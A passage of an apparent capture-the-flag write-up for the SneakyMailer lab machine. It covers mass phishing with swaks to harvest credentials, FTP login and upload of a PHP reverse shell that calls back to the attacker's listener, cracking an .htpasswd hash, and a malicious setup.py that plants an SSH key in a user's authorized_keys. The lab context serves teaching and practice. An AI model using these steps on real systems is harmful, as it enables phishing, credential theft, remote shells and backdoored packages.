<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s">"Phishing Mail Sent"</span><span class="p">)</span>
</pre></table></code></div></div><h4 id="sending-mail">Sending Mail</h4><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/sneakymailer
→ ./ultrafisher.py emails.txt
<span class="o">[</span>∧] Sending Mail to -&gt; donnasnider@sneakymailer.htb

<span class="o">[</span>+] Phishing Mail Sent
</pre></table></code></div></div><p>Once the mail is sent to all the email addresses, we should see a confirmation as <code class="language-plaintext highlighter-rouge">Phishing Mail Sent</code>. In case if we had any invalid email address the script should have pointed out that as well.</p><h4 id="creds">Creds</h4><p>Once the script execution is completed we get a call back on our listener with url encoded creds. It appears the user with email id <code class="language-plaintext highlighter-rouge">paulbyrd@sneakymailer.htb</code> visited our link and dropped his creds.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/sneakymailer
→ nc <span class="nt">-lvnp</span> 8040
Ncat: Version 7.91 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::8040
Ncat: Listening on 0.0.0.0:8040
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:58836.
POST / HTTP/1.1
Host: 10.10.14.3:8040
User-Agent: python-requests/2.23.0
Accept-Encoding: <span class="nb">gzip</span>, deflate
Accept: <span class="k">*</span>/<span class="k">*</span>
Connection: keep-alive
Content-Length: 185
Content-Type: application/x-www-form-urlencoded

<span class="nv">firstName</span><span class="o">=</span>Paul&amp;lastName<span class="o">=</span>Byrd&amp;email<span class="o">=</span>paulbyrd%40sneakymailer.htb&amp;password<span class="o">=</span>%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword<span class="o">=</span>%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
</pre></table></code></div></div><h4 id="swaks">Swaks</h4><p>We could also achieve the same using <code class="language-plaintext highlighter-rouge">swaks</code> a commandline tool to send emails:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/sneakymailer
→ <span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>emails.txt<span class="si">)</span><span class="p">;</span> <span class="k">do </span>swaks <span class="nt">--server</span> 10.10.10.197 <span class="nt">--from</span> <span class="s1">'cold@fusionsecurity.cfx'</span> <span class="nt">--to</span> <span class="nv">$i</span> <span class="nt">--header</span> <span class="s2">"Subject: Anything"</span> <span class="nt">--body</span> <span class="s2">"Click on http://10.10.14.3:8040"</span><span class="p">;</span> <span class="k">done</span>
<span class="o">===</span> Trying 10.10.10.197:25...
<span class="o">===</span> Connected to 10.10.10.197.
&lt;-  220 debian ESMTP Postfix <span class="o">(</span>Debian/GNU<span class="o">)</span>
 -&gt; EHLO cfx
&lt;-  250-debian
&lt;-  250-PIPELINING
&lt;-  250-SIZE 10240000
&lt;-  250-VRFY
&lt;-  250-ETRN
&lt;-  250-STARTTLS
&lt;-  250-ENHANCEDSTATUSCODES
&lt;-  250-8BITMIME
&lt;-  250-DSN
&lt;-  250-SMTPUTF8
&lt;-  250 CHUNKING
 -&gt; MAIL FROM:&lt;cold@fusionsecurity.cfx&gt;
&lt;-  250 2.1.0 Ok
 -&gt; RCPT TO:&lt;tigernixon@sneakymailer.htb&gt;
&lt;-  250 2.1.5 Ok
 -&gt; DATA
&lt;-  354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
 -&gt; Date: Tue, 01 Dec 2020 21:54:22 +0530
 -&gt; To: tigernixon@sneakymailer.htb
 -&gt; From: cold@fusionsecurity.cfx
 -&gt; Subject: Anything
 -&gt; Message-Id: &lt;20201201215422.006428@cfx&gt;
 -&gt; X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -&gt;
 -&gt; Click on http://10.10.14.3:8040
 -&gt;
 -&gt;
 <span class="o">[</span>..SNIP..]
 &lt;-  250 2.0.0 Ok: queued as 51784246DE
 -&gt; QUIT
&lt;-  221 2.0.0 Bye
<span class="o">===</span> Connection closed with remote host.
</pre></table></code></div></div><p>Call-back on nc listener:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/sneakymailer
→ nc <span class="nt">-lvnp</span> 8040
Ncat: Version 7.91 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::8040
Ncat: Listening on 0.0.0.0:8040
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:54932.
POST / HTTP/1.1
Host: 10.10.14.3:8040
User-Agent: python-requests/2.23.0
Accept-Encoding: <span class="nb">gzip</span>, deflate
Accept: <span class="k">*</span>/<span class="k">*</span>
Connection: keep-alive
Content-Length: 185
Content-Type: application/x-www-form-urlencoded

<span class="nv">firstName</span><span class="o">=</span>Paul&amp;lastName<span class="o">=</span>Byrd&amp;email<span class="o">=</span>paulbyrd%40sneakymailer.htb&amp;password<span class="o">=</span>%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword<span class="o">=</span>%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
</pre></table></code></div></div><p>After url decoding the data we have the following:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="go">firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt

firstName=Paul
lastName=Byrd
email=paulbyrd@sneakymailer.htb
</span><span class="gp">password=^(#</span>J@SkFv2[%KhIxKk<span class="o">(</span>Ju<span class="sb">`</span>hqcHl&lt;:Ht
<span class="gp">rpassword=^(#</span>J@SkFv2[%KhIxKk<span class="o">(</span>Ju<span class="sb">`</span>hqcHl&lt;:Ht
</pre></table></code></div></div><h3 id="paul-byrd---mailbox-access">Paul Byrd - Mailbox access</h3><p>Unfortunately Paul’s creds doesn’t work for on SSH or FTP but they did work for accessing his mailbox. We can use mail client such as thunderbird or Evolution to access his mailbox, here we’ll be using thunderbird.</p><p>Step1: First open thunderbird then Select Local folder -&gt; Set up an account - Select Email -&gt; Give Paul’s Email and Password</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/SneakyM/email1.png" alt="email1" /></p><p>Step2: Select Configure Manually -&gt; Go to Advance Config (You should see a prompt with account creation warning)</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/SneakyM/email2.png" alt="email2" /></p><p>Step3: Change the username to <code class="language-plaintext highlighter-rouge">paulbyrd</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/SneakyM/email3.png" alt="email3" /></p><p>Step4: Go to Outgoing Server(SMTP) option and fill Server details and Username</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/SneakyM/email4.png" alt="email4" /></p><p>Now, You should see Paul’s mailbox has appeared on thunderbird, just right click -&gt; Get Messages and done now you should have Paul’s mailbox ready.</p><p>Inside Sent items, we find two mails one of which is a password reset mail.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/SneakyM/email5.png" alt="email5" /></p><h3 id="ftp---developer">FTP - developer</h3><p>Using developer creds we can login to FTP:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
</span></pre></table></code></div></div><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/sneakymailer
→ ftp 10.10.10.197
Connected to 10.10.10.197.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>10.10.10.197:root<span class="o">)</span>: developer
331 Please specify the password.
Password:
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
</pre></table></code></div></div><p>Inside we find a <code class="language-plaintext highlighter-rouge">dev</code> directory:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>ftp&gt; <span class="nb">ls
</span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    8 0        1001         4096 Jun 30 00:15 dev
</pre></table></code></div></div><p>Inside dev we find website related data, although <code class="language-plaintext highlighter-rouge">team.php</code> looks familiar:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>ftp&gt; <span class="nb">cd </span>dev
250 Directory successfully changed.
ftp&gt; <span class="nb">ls
</span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 26 18:52 css
drwxr-xr-x    2 0        0            4096 May 26 18:52 img
<span class="nt">-rwxr-xr-x</span>    1 0        0           13742 Jun 23 08:44 index.php
drwxr-xr-x    3 0        0            4096 May 26 18:52 js
drwxr-xr-x    2 0        0            4096 May 26 18:52 pypi
drwxr-xr-x    4 0        0            4096 May 26 18:52 scss
<span class="nt">-rwxr-xr-x</span>    1 0        0           26523 May 26 19:58 team.php
drwxr-xr-x    8 0        0            4096 May 26 18:52 vendor
</pre></table></code></div></div><p>Trying <code class="language-plaintext highlighter-rouge">sneakycorp.htb/dev/team.php</code> didn’t return anything. Which indicates there could be a subdomain which we are not aware of, having that thought in mind I decided to fuzz the site for subdomains.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/sneakymailer
→ ffuf <span class="nt">-c</span> <span class="nt">-r</span> <span class="nt">-u</span> http://10.10.10.197 <span class="nt">-H</span> <span class="s1">'Host:FUZZ.sneakycorp.htb'</span> <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt <span class="nt">-fl</span> 335

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.197
 :: Header           : Host: FUZZ.sneakycorp.htb
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response lines: 335
________________________________________________

dev                     [Status: 200, Size: 13737, Words: 4007, Lines: 341]
:: Progress: [19983/19983] :: Job [1/1] :: 243 req/sec :: Duration: [0:01:22] :: Errors: 0 ::
</span></pre></table></code></div></div><p>Adding <code class="language-plaintext highlighter-rouge">dev.sneakycorp.htb</code> into /etc/hosts file and visiting <a href="http://dev.sneakycorp.htb">http://dev.sneakycorp.htb</a> returns the similar kind of website which we saw earlier.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/SneakyM/dev.png" alt="dev" /></p><h3 id="reverse-shell">Reverse Shell</h3><p>It appears we can upload files into ftp and the root folder is of dev.sneakycorp.htb, So we’ll upload a <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell"><strong>PHP reverse shell</strong></a>:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>ftp&gt; put rev.php
<span class="nb">local</span>: rev.php remote: rev.php
200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5493 bytes sent <span class="k">in </span>0.00 secs <span class="o">(</span>26.4572 MB/s<span class="o">)</span>
</pre></table></code></div></div><p>Seems there is cron running which deletes the uploaded files so we need to be quick and trigger it to get a reverse shell:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/sneakymailer
→ curl http://dev.sneakycorp.htb/rev.php
</pre></table></code></div></div><h4 id="www-data-shell">www-data shell</h4><p>Getting a call back on <code class="language-plaintext highlighter-rouge">nc</code> listener:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/sneakymailer
→ nc <span class="nt">-lvnp</span> 8020
Ncat: Version 7.91 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::8020
Ncat: Listening on 0.0.0.0:8020
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:50844.
Linux sneakymailer 4.19.0-9-amd64 <span class="c">#1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux</span>
 12:36:06 up 13 min,  0 <span class="nb">users</span>,  load average: 0.03, 0.04, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
$ python3 -c "import pty;pty.spawn('</span>/bin/bash<span class="s1">')"
www-data@sneakymailer:/$ whoami
whoami
www-data
</span></pre></table></code></div></div><h2 id="elevating-priv-www-data---low">Elevating Priv www-data -&gt; low</h2><h3 id="enumeration">Enumeration</h3><p>Initial enumeration reveals that user flag is located inside home directory of user <code class="language-plaintext highlighter-rouge">low</code> and we don’t have the permission to read it.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>www-data@sneakymailer:/home<span class="nv">$ </span><span class="nb">ls
</span>low  vmail

www-data@sneakymailer:/home/low<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 8
www-data@sneakymailer:/home/low<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="nb">ls</span> <span class="nt">-la</span>
total 48
drwxr-xr-x 8 low  low  4096 Jun  8 03:47 <span class="nb">.</span>
drwxr-xr-x 4 root root 4096 May 14  2020 ..
lrwxrwxrwx 1 root root    9 May 19  2020 .bash_history -&gt; /dev/null
<span class="nt">-rw-r--r--</span> 1 low  low   220 May 14  2020 .bash_logout
<span class="nt">-rw-r--r--</span> 1 low  low  3526 May 14  2020 .bashrc
drwxr-xr-x 3 low  low  4096 May 16  2020 .cache
drwx------ 3 low  low  4096 May 14  2020 .gnupg
drwxr-xr-x 3 low  low  4096 May 16  2020 .local
dr-x------ 2 low  low  4096 May 16  2020 .pip
<span class="nt">-rw-r--r--</span> 1 low  low   807 May 14  2020 .profile
drwxr-xr-x 2 low  low  4096 Jun  8 03:47 .ssh
<span class="nt">-rwxr-x---</span> 1 root low    33 Dec  1 11:35 user.txt
drwxr-xr-x 6 low  low  4096 May 16  2020 venv
</pre></table></code></div></div><p>Now this is where things get interesting cause based on the second mail inside paul’s mailbox, user low has to install, test and erase python module in PyPI service.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/SneakyM/low.png" alt="low" /></p><h3 id="pypi-service">PyPI service</h3><p><code class="language-plaintext highlighter-rouge">ss</code> output shows there is service listening on 127.0.0.1:5000 which could be the PyPI service we are looking for.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>www-data@sneakymailer:/<span class="nv">$ </span>ss <span class="nt">-tnlp</span>
ss <span class="nt">-tnlp</span>
State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port
LISTEN    0         5                127.0.0.1:5000             0.0.0.0:<span class="k">*</span>
LISTEN    0         128                0.0.0.0:80               0.0.0.0:<span class="k">*</span>        <span class="nb">users</span>:<span class="o">((</span><span class="s2">"nginx"</span>,pid<span class="o">=</span>764,fd<span class="o">=</span>8<span class="o">)</span>,<span class="o">(</span><span class="s2">"nginx"</span>,pid<span class="o">=</span>763,fd<span class="o">=</span>8<span class="o">))</span>
LISTEN    0         128                0.0.0.0:8080             0.0.0.0:<span class="k">*</span>        <span class="nb">users</span>:<span class="o">((</span><span class="s2">"nginx"</span>,pid<span class="o">=</span>764,fd<span class="o">=</span>6<span class="o">)</span>,<span class="o">(</span><span class="s2">"nginx"</span>,pid<span class="o">=</span>763,fd<span class="o">=</span>6<span class="o">))</span>
LISTEN    0         128                0.0.0.0:22               0.0.0.0:<span class="k">*</span>
LISTEN    0         100                0.0.0.0:25               0.0.0.0:<span class="k">*</span>
<span class="o">[</span>..SNIP..]
</pre></table></code></div></div><p>Inside the home directory of www-data we find another subdomain <code class="language-plaintext highlighter-rouge">pypi.sneakycorp.htb</code> which we’ll add to our hosts file:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>www-data@sneakymailer:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="nb">ls</span> <span class="nt">-la</span>
total 24
drwxr-xr-x  6 root root 4096 May 14  2020 <span class="nb">.</span>
drwxr-xr-x 12 root root 4096 May 14  2020 ..
drwxr-xr-x  3 root root 4096 Jun 23 08:15 dev.sneakycorp.htb
drwxr-xr-x  2 root root 4096 May 14  2020 html
drwxr-xr-x  4 root root 4096 May 15  2020 pypi.sneakycorp.htb
drwxr-xr-x  8 root root 4096 Jun 23 09:48 sneakycorp.htb
</pre></table></code></div></div><p>Although if we try to visit <a href="http://pypi.sneakycorp.htb">http://pypi.sneakycorp.htb</a> we get redirected to sneakycorp.htb</p><p>Based on our nmap scan we saw nginx is in use, looking at the nginx config files we see <code class="language-plaintext highlighter-rouge">pypi.sneakycorp.htb</code> is one of active sites:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>www-data@sneakymailer:/etc/nginx/sites-enabled<span class="nv">$ </span><span class="nb">ls
</span>pypi.sneakycorp.htb  sneakycorp.htb
</pre></table></code></div></div><p>Inside config file we see <code class="language-plaintext highlighter-rouge">pypi.sneakycorp.htb:8080</code> will proxy through 127.0.0.1:5000, where is PyPi service is listening</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">sneakymailer</span><span class="o">:/</span><span class="n">etc</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">sites</span><span class="o">-</span><span class="n">enabled</span><span class="err">$</span> <span class="n">cat</span> <span class="n">pypi</span><span class="p">.</span><span class="n">sneakycorp</span><span class="p">.</span><span class="n">htb</span>

<span class="n">server</span> <span class="p">{</span>
        <span class="n">listen</span> <span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="o">:</span><span class="mi">8080</span> <span class="n">default_server</span><span class="p">;</span>
        <span class="n">listen</span> <span class="p">[</span><span class="o">::</span><span class="p">]</span><span class="o">:</span><span class="mi">8080</span> <span class="n">default_server</span><span class="p">;</span>
        <span class="n">server_name</span> <span class="n">_</span><span class="p">;</span>
<span class="p">}</span>


<span class="n">server</span> <span class="p">{</span>
        <span class="n">listen</span> <span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="o">:</span><span class="mi">8080</span><span class="p">;</span>
        <span class="n">listen</span> <span class="p">[</span><span class="o">::</span><span class="p">]</span><span class="o">:</span><span class="mi">8080</span><span class="p">;</span>

        <span class="n">server_name</span> <span class="n">pypi</span><span class="p">.</span><span class="n">sneakycorp</span><span class="p">.</span><span class="n">htb</span><span class="p">;</span>

        <span class="n">location</span> <span class="o">/</span> <span class="p">{</span>
                <span class="n">proxy_pass</span> <span class="n">http</span><span class="o">:</span><span class="c1">//127.0.0.1:5000;</span>
                <span class="n">proxy_set_header</span> <span class="n">Host</span> <span class="err">$</span><span class="n">host</span><span class="p">;</span>
                <span class="n">proxy_set_header</span> <span class="n">X</span><span class="o">-</span><span class="n">Real</span><span class="o">-</span><span class="n">IP</span> <span class="err">$</span><span class="n">remote_addr</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Now we can visit <code class="language-plaintext highlighter-rouge">pypi.sneakycorp.htb:8080</code> which clearly indicates we can create our malicious python package and host it on pypi server.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/SneakyM/pypi.png" alt="pypi" /></p><p>To upload the python package we’ll need to be authenticated, inside <code class="language-plaintext highlighter-rouge">pypi.sneakycorp.htb</code> directory we find a <code class="language-plaintext highlighter-rouge">.htpasswd</code> file containing password hash:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>www-data@sneakymailer:~/pypi.sneakycorp.htb<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 20
drwxr-xr-x 4 root root     4096 May 15  2020 <span class="nb">.</span>
drwxr-xr-x 6 root root     4096 May 14  2020 ..
<span class="nt">-rw-r--r--</span> 1 root root       43 May 15  2020 .htpasswd
drwxrwx--- 2 root pypi-pkg 4096 Jun 30 02:24 packages
drwxr-xr-x 6 root pypi     4096 May 14  2020 venv
www-data@sneakymailer:~/pypi.sneakycorp.htb<span class="nv">$ </span><span class="nb">cat</span> .htpasswd
pypi:<span class="nv">$apr1$RV5c5YVs$U9</span>.OTqF5n8K4mxWpSSR/p/
</pre></table></code></div></div><p>We can crack it using john which results the creds as <code class="language-plaintext highlighter-rouge">pypi:soufianeelhaoui</code></p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/sneakymailer
→ john <span class="nt">--show</span> pypi.hash
pypi:soufianeelhaoui

1 password <span class="nb">hash </span>cracked, 0 left
</pre></table></code></div></div><h3 id="malicious-python-package">Malicious Python Package</h3><p>With reference to this <a href="https://www.linode.com/docs/guides/how-to-create-a-private-python-package-repository/"><strong>article</strong></a> we can create and upload our malicious python package to PyPi server</p><ul><li>Step1 : Creating all the required files</li></ul><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>www-data@sneakymailer:/tmp<span class="nv">$ </span><span class="nb">mkdir </span>coldfx

www-data@sneakymailer:/tmp<span class="nv">$ </span><span class="nb">cd </span>coldfx

www-data@sneakymailer:/tmp/coldfx<span class="nv">$ </span><span class="nb">touch </span>setup.py setup.cfg README.md .pypirc

www-data@sneakymailer:/tmp/coldfx<span class="nv">$ </span><span class="nb">mkdir </span>cfx-key

www-data@sneakymailer:/tmp/coldfx<span class="nv">$ </span><span class="nb">cd </span>cfx-key

www-data@sneakymailer:/tmp/coldfx/cfx<span class="nv">$ </span><span class="nb">touch </span>__init__.py

www-data@sneakymailer:/tmp/coldfx<span class="nv">$ </span>find <span class="nb">.</span>
find <span class="nb">.</span>
<span class="nb">.</span>
./cfx-key
./cfx-key/__init__.py
./.pypirc
./setup.cfg
./README.md
./setup.py
</pre></table></code></div></div><p>When we are running a python script, <code class="language-plaintext highlighter-rouge">__init__.py</code> is the file which it looks for loading the package.</p><ul><li>Step2 : Now using nano we’ll input data into these files which is required for the package to run.</li></ul><p>Adding an example function to <code class="language-plaintext highlighter-rouge">__init__.py</code> inside cfx-key directory</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>www-data@sneakymailer:/tmp/coldfx/cfx-key<span class="nv">$ </span><span class="nb">cat </span>__init__.py
def hello_word<span class="o">()</span>:
print<span class="o">(</span>“hello world”<span class="o">)</span>
</pre></table></code></div></div><p>Defining server &amp; authentication details into <code class="language-plaintext highlighter-rouge">.pypirc</code>:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>www-data@sneakymailer:/tmp/coldfx<span class="nv">$ </span><span class="nb">cat</span> .pypirc
<span class="o">[</span>distutils]
index-servers <span class="o">=</span> cfx-key

<span class="o">[</span>cfx-key]
repository: http://pypi.sneakycorp.htb:8080
username: pypi
password: soufianeelhaoui
</pre></table></code></div></div><p>Adding metadata:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>www-data@sneakymailer:/tmp/coldfx<span class="nv">$ </span><span class="nb">cat </span>setup.cfg
<span class="o">[</span>metadata]
description-file <span class="o">=</span> README.md
</pre></table></code></div></div><ul><li>Step3 : Creating <code class="language-plaintext highlighter-rouge">setup.py</code> to a ssh key to low’s account:</li></ul><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">setuptools</span> <span class="kn">import</span> <span class="n">setup</span>

<span class="k">try</span><span class="p">:</span>
    <span class="k">with</span> <span class="nb">open</span> <span class="p">(</span><span class="s">'/home/low/.ssh/authorized_keys'</span><span class="p">,</span> <span class="s">'a'</span><span class="p">)</span> <span class="k">as</span> <span class="n">fl</span><span class="p">:</span>
        <span class="n">fl</span><span class="p">.</span><span class="n">write</span> <span class="p">(</span><span class="s">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+OOk/amwKEW/gfCikP+y0hqTkgXyICKUegxd2bZCr7CdbACbL+zJn9cV6T4XutmP6JOetxFytws9yO01X2kxkRRhIKH8DFpall5smoaJ1biwOsd6QHQJ7QLsMQIyzhy2qbq1rmi9ubSagBU9qmV4XbQwIM8fpapyV [..SNIP..] root@cfx"</span><span class="p">)</span>

<span class="k">except</span><span class="p">:</span>
